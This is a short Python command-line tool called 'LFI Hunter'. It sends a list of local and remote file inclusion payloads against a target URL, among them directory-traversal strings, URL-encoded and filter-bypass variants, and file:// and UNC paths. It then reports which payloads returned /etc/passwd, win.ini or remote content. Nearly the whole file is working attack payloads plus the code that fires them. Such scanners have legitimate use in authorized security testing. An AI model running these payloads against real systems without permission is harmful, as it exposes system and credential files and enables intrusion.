#!/usr/bin/env python3
import requests
import sys
from termcolor import colored

test_payloads = [
    # Linux payloads
    '../../../../../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../etc/passwd',
    '../etc/passwd',
    '/etc/passwd',
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    
    # Windows payloads
    '../../../../../../../../windows/win.ini',
    '../../../../../windows/win.ini',
    '../../windows/win.ini',
    '../windows/win.ini',
    '/windows/win.ini',
    '..\\..\\..\\windows\\win.ini',
    'C:\\windows\\win.ini',
    
    # File URI scheme
    'file:///etc/passwd',
    # RFI payloads (modified to use public resources)
    'http://example.com/',
    'https://www.google.com/favicon.ico',
    'ftp://ftp.gnu.org/gnu/README',
    '//example.com/test.txt',
    '\\\\example.com\\share\\test.txt'
]

def test_lfi(url):
    print(f"\nTesting URL: {url}")
    found_vulnerabilities = []
    
    for payload in test_payloads:
        try:
            test_url = url + payload
            
            response = requests.get(test_url, timeout=5)
            
            if "root:x:" in response.text:
                found_vulnerabilities.append(("Linux", payload))
            
            elif "[boot loader]" in response.text:
                found_vulnerabilities.append(("Windows", payload))
            elif "example.com" in payload and "Example Domain" in response.text:
                found_vulnerabilities.append(("RFI",payload))
            elif "google.com" in payload and response.status_code == 200:
                found_vulnerabilities.append(("RFI", payload))
            elif "gnu.org" in payload and "GNU" in response.text:
                found_vulnerabilities.append(("RFI", payload))
                
        except Exception as e:
            continue
    

    if found_vulnerabilities:
        print(colored("\n[+] LFI Vulnerabilities Found:","green"))
        for system, payload in found_vulnerabilities:
            print(colored(f"  {system} vulnerability with payload: {payload}","green"))
        return True
    else:
        print(colored("\n[+] No LFI Vulnerabilities Found","green"))
        return False

def main():
    print(colored("\tLFI Hunter","red"))
    print(colored("="*30,"red"))
    
    
    if len(sys.argv) < 2:
        print("\nUsage: python lfihunter.py <URL>")
        print('Example: python lfihunter.py "http://example.com/filename="')
        sys.exit()
    
    
    url = sys.argv[1]
    
    # Make sure URL starts with http:// or https://
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    # Run the test
    test_lfi(url)

if __name__ == "__main__":
    main()